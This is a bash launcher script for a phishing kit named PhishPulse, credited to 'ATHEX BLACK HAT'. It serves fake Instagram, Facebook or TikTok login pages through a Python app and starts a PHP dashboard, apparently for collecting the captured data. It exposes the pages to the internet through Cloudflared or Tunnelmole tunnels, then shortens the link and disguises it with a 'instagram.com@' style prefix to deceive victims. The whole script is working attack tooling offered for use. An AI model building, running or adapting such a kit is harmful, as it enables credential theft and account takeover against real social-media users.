#!/bin/bash

# ============================================
# PhishPulse - Advanced Multi-Platform Tool
# Version: 1.0
# Author: ATHEX BLACK HAT
# ============================================

ANTI_THEFT_CHECK() {
    AUTHOR_LINE=$(grep -c "ATHEX BLACK HAT" "$0" 2>/dev/null)
    if [ "$AUTHOR_LINE" -lt 2 ]; then
        echo ""
        echo "  ⚠️  INTEGRITY CHECK!                                 "
        echo "                                                              "
        echo "  Just changing a name and ASCII banner can't make            "
        echo "  you a programmer.                                           "
        echo "                                                              "
        echo "  So don't be cool, learn and create your own.                "
        echo "  Don't try to steal others' hardwork!                        "
        echo "                                                              "
        echo "  Original Author: ATHEX BLACK HAT                           "
        echo "  Tool: PhishPulse v1.0                                      "
        echo ""
        exit 1
    fi
}
ANTI_THEFT_CHECK
GREEN='\033[1;32m'
LIGHT_GREEN='\033[0;32m'
BRIGHT_GREEN='\033[38;5;46m'
DARK_GREEN='\033[38;5;22m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RED='\033[1;31m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'
VERSION="1.0"
TOOL_NAME="PhishPulse"
AUTHOR="ATHEX BLACK HAT"
banner() {
    clear
    echo -e "${BRIGHT_GREEN}"
    echo "                                                                                  "
    echo "  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██████╗ ██╗   ██╗██╗     ███████╗███████╗   "
    echo "  ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔══██╗██║   ██║██║     ██╔════╝██╔════╝    "
    echo "  ██████╔╝███████║██║███████╗███████║██████╔╝██║   ██║██║     ███████╗█████╗       "
    echo "  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔═══╝ ██║   ██║██║     ╚════██║██╔══╝      "
    echo "  ██║     ██║  ██║██║███████║██║  ██║██║     ╚██████╔╝███████╗███████╗███████╗    "
    echo "  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝    "
    echo "                                                                                  "
    echo "                       Advanced Multi-Platform Tool                               "
    echo "                         v${VERSION} by ${AUTHOR}                                 "
    echo "                                                                                  "
    echo -e "${RESET}" 
}
cleanup() {
    echo -e "\n${YELLOW}[!] Cleaning up...${RESET}"
    if pgrep -f "cloudflared" > /dev/null; then
        killall cloudflared 2>/dev/null
        echo -e "${GREEN}[✓] Cloudflared stopped${RESET}"
    fi
    if pgrep -f "tunnelmole" > /dev/null || pgrep -f "tmole" > /dev/null; then
        pkill -f "tunnelmole" 2>/dev/null
        pkill -f "tmole" 2>/dev/null
        echo -e "${GREEN}[✓] Tunnelmole stopped${RESET}"
    fi
    if pgrep -f "gunicorn" > /dev/null; then
        pkill -f "gunicorn" 2>/dev/null
        echo -e "${GREEN}[✓] Gunicorn stopped${RESET}"
    fi
    if pgrep -f "php.*dashboard" > /dev/null; then
        pkill -f "php.*8888" 2>/dev/null
        echo -e "${GREEN}[✓] PHP Dashboard stopped${RESET}"
    fi
    if [[ -n "$VIRTUAL_ENV" ]]; then
        deactivate 2>/dev/null
    fi
    echo -e "${GREEN}[✓] Cleanup complete!${RESET}\n"
    exit 0
}
trap cleanup SIGINT SIGTERM
check_dependencies() {
    echo -e "\n${CYAN}[*] Checking dependencies...${RESET}\n"
    if ! command -v python3 &> /dev/null; then
        echo -e "${RED}[!] Python3 not found! Installing...${RESET}"
        sudo apt-get update && sudo apt-get install -y python3 python3-pip
    fi
    echo -e "${GREEN}[✓] Python3 found${RESET}"
    if ! command -v php &> /dev/null; then
        echo -e "${RED}[!] PHP not found! Installing...${RESET}"
        sudo apt-get install -y php-cli
    fi
    echo -e "${GREEN}[✓] PHP found${RESET}"
    if ! command -v curl &> /dev/null; then
        sudo apt-get install -y curl
    fi
    echo -e "${GREEN}[✓] Curl found${RESET}"
    if ! command -v jq &> /dev/null; then
        sudo apt-get install -y jq
    fi
    echo -e "${GREEN}[✓] jq found${RESET}"
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${YELLOW}[!] Cloudflared not found! Installing...${RESET}"
        sudo curl -L -o /usr/local/bin/cloudflared https://github.com/cloudflare/cloudflared/releases/download/2025.1.0/cloudflared-linux-amd64
        sudo chmod +x /usr/local/bin/cloudflared
    fi
    echo -e "${GREEN}[✓] Cloudflared found${RESET}"
    if ! command -v node &> /dev/null; then
        echo -e "${YELLOW}[!] Node.js not found! Installing...${RESET}"
        curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
        sudo apt-get install -y nodejs
    fi
    echo -e "${GREEN}[✓] Node.js found${RESET}"
    if ! command -v tunnelmole &> /dev/null; then
        echo -e "${YELLOW}[!] Tunnelmole not found! Installing...${RESET}"
        sudo npm install -g tunnelmole
    fi
    echo -e "${GREEN}[✓] Tunnelmole found${RESET}"
}
setup_python() {
    echo -e "\n${CYAN}[*] Setting up Python environment...${RESET}\n"
    if [ ! -f "requirements.txt" ]; then
        echo -e "${RED}[!] requirements.txt not found!${RESET}"
        exit 1
    fi
    if [ ! -d "env" ]; then
        python3 -m venv env
        echo -e "${GREEN}[✓] Virtual environment created${RESET}"
    fi
    source ./env/bin/activate
    pip install --upgrade pip -q
    pip install -r requirements.txt -q
    
    echo -e "${GREEN}[✓] Python dependencies installed${RESET}"
}
short_url() {
    local long_url="$1"
    local api_endpoint="https://ulvis.net/API/write/post"
    
    local response=$(curl -s -X POST -d "url=$long_url" "$api_endpoint" 2>/dev/null)
    if echo "$response" | jq -e '.success' >/dev/null 2>&1; then
        echo "$(echo "$response" | jq -r '.data.url')"
    else
        echo "$long_url"
    fi
}
mask_url() {
    local long_url="$1"
    local platform="$2"
    echo -e "\n${CYAN}[*] URL Shortening...${RESET}"
    sleep 1
    local short_url=$(short_url "$long_url")
    case $platform in
        instagram) default_domain="instagram.com" ;;
        facebook) default_domain="facebook.com" ;;
        tiktok) default_domain="tiktok.com" ;;
        *) default_domain="social-app.com" ;;
    esac
    echo -e -n "${YELLOW}[?] Enter custom domain (default: ${default_domain}): ${RESET}"
    read -r custom_domain
    custom_domain=${custom_domain:-$default_domain}
    local masked_url=$(echo "$short_url" | sed "s|https://|https://${custom_domain}@|")
    echo -e "\n${GREEN}[✓] URL Masking Complete!${RESET}"
    echo ""
    echo -e "${PURPLE}${RESET}  ${BOLD}Masked URL:${RESET} ${BRIGHT_GREEN}${masked_url}${RESET}"
    MASKED_URL="$masked_url"
}
main_menu() {
    banner
    echo -e "\n${CYAN}${RESET}"
    echo -e "${CYAN}${RESET}  ${BOLD}SELECT PLATFORM${RESET}                                              ${CYAN}${RESET}"
    echo -e "${CYAN}...............................................................${RESET}"
    echo -e "${CYAN}${RESET}  ${GREEN}[1]${RESET} Instagram                                                ${CYAN}${RESET}"
    echo -e "${CYAN}${RESET}  ${BLUE}[2]${RESET} Facebook                                                 ${CYAN}${RESET}"
    echo -e "${CYAN}${RESET}  ${PURPLE}[3]${RESET} TikTok                                                   ${CYAN}${RESET}"
    echo -e "${CYAN}................................................................${RESET}"
    
    while true; do
        echo -e -n "${YELLOW}[?] Choose platform (1-3): ${RESET}"
        read -r platform_choice
        
        case $platform_choice in
            1) PLATFORM="instagram"; break ;;
            2) PLATFORM="facebook"; break ;;
            3) PLATFORM="tiktok"; break ;;
            *) echo -e "${RED}[!] Invalid choice!${RESET}" ;;
        esac
    done
    
    export PHISH_PLATFORM=$PLATFORM
    
    clear
    banner
    echo -e "\n${GREEN}[✓] Platform selected: ${BRIGHT_GREEN}${PLATFORM^^}${RESET}"
    
    echo -e -n "\n${YELLOW}[?] Enter port (default: 8080): ${RESET}"
    read -r port
    port=${port:-8080}
    export PORT=$port
    
    echo -e "\n${CYAN}${RESET}"
    echo -e "${CYAN}${RESET}  ${BOLD}SELECT TUNNEL METHOD${RESET}                                          ${CYAN}${RESET}"
    echo -e "${CYAN}${RESET}"
    echo -e "${CYAN}${RESET}  ${GREEN}[1]${RESET} Localhost (Testing)                                      ${CYAN}${RESET}"
    echo -e "${CYAN}${RESET}  ${BLUE}[2]${RESET} Cloudflared (Recommended)                                ${CYAN}${RESET}"
    echo -e "${CYAN}${RESET}  ${PURPLE}[3]${RESET} Tunnelmole                                               ${CYAN}${RESET}"
    echo -e "${CYAN}${RESET}"
    
    while true; do
        echo -e -n "${YELLOW}[?] Choose method (1-3): ${RESET}"
        read -r method_choice
        
        case $method_choice in
            1|2|3) TUNNEL_METHOD=$method_choice; break ;;
            *) echo -e "${RED}[!] Invalid choice!${RESET}" ;;
        esac
    done
    
    # Dashboard
    echo -e -n "\n${YELLOW}[?] Start PHP Dashboard? (Y/n): ${RESET}"
    read -r start_dashboard
    start_dashboard=${start_dashboard:-Y}
    
    if [[ "$start_dashboard" =~ ^[Yy] ]]; then
        echo -e -n "${YELLOW}[?] Dashboard port (default: 8888): ${RESET}"
        read -r dashboard_port
        dashboard_port=${dashboard_port:-8888}
        
        # Start PHP dashboard
        echo -e "\n${CYAN}[*] Starting PHP Dashboard...${RESET}"
        php -S localhost:$dashboard_port -t dashboard/ > /dev/null 2>&1 &
        echo -e "${GREEN}[✓] Dashboard started on http://localhost:${dashboard_port}${RESET}"
        
        DASHBOARD_URL="http://localhost:${dashboard_port}"
        export DASHBOARD_URL
    fi
    echo -e "\n${CYAN}[*] Starting PhishPulse...${RESET}"
    source ./env/bin/activate
    python3 app.py &
    sleep 2
    
    clear
    banner
    
    case $TUNNEL_METHOD in
        1)
            echo -e "\n${GREEN}${RESET}"
            echo -e "${GREEN}${RESET}  ${BOLD}Local URL:${RESET} http://127.0.0.1:${port}"
            echo -e "${GREEN}${RESET}"
            
            echo -e -n "\n${YELLOW}[?] Do you want to mask this URL? (Y/n): ${RESET}"
            read -r mask_choice
            mask_choice=${mask_choice:-Y}
            
            if [[ "$mask_choice" =~ ^[Yy] ]]; then
                mask_url "http://127.0.0.1:${port}" "$PLATFORM"
            fi
            ;;
        
        2)
            echo -e "\n${CYAN}[*] Starting Cloudflared tunnel...${RESET}"
            cloudflared tunnel --no-autoupdate --metrics localhost:55555 --url http://localhost:$port > /dev/null 2>&1 &
            sleep 3
            
            original_url=""
            while [[ -z "$original_url" || "$original_url" == "null" ]]; do
                original_url=$(curl -s http://localhost:55555/quicktunnel | jq -r '.hostname')
                sleep 1
            done
            
            original_url="https://${original_url}"
            
            echo -e "\n${GREEN}${RESET}"
            echo -e "${GREEN}${RESET}  ${BOLD}Original URL:${RESET} ${original_url}"
            echo -e "${GREEN}${RESET}"
            
            echo -e -n "\n${YELLOW}[?] Do you want to mask this URL? (Y/n): ${RESET}"
            read -r mask_choice
            mask_choice=${mask_choice:-Y}
            
            if [[ "$mask_choice" =~ ^[Yy] ]]; then
                mask_url "$original_url" "$PLATFORM"
            fi
            ;;
        
        3)
            echo -e "\n${CYAN}[*] Starting Tunnelmole...${RESET}"
            tunnelmole $port
            ;;
    esac
    echo ""
    echo -e "${PURPLE}${RESET}"
    echo -e "${PURPLE}${RESET}  ${BOLD}PhishPulse v${VERSION} - Running${RESET}                              ${PURPLE}${RESET}"
    echo -e "${PURPLE}${RESET}  Platform: ${BRIGHT_GREEN}${PLATFORM^^}${RESET}                                      ${PURPLE}${RESET}"
    if [[ -n "$DASHBOARD_URL" ]]; then
        echo -e "${PURPLE}${RESET}  Dashboard: ${YELLOW}${DASHBOARD_URL}${RESET}                                ${PURPLE}${RESET}"
    fi
    echo -e "${PURPLE}${RESET}  Author: ${RED}ATHEX BLACK HAT${RESET}                                   ${PURPLE}${RESET}"
    echo -e "${PURPLE}${RESET}  Press ${RED}Ctrl+C${RESET} to stop                                      ${PURPLE}${RESET}"
    echo -e "${PURPLE}${RESET}"
    echo ""
    while true; do
        sleep 1
    done
}
check_dependencies
setup_python
main_menu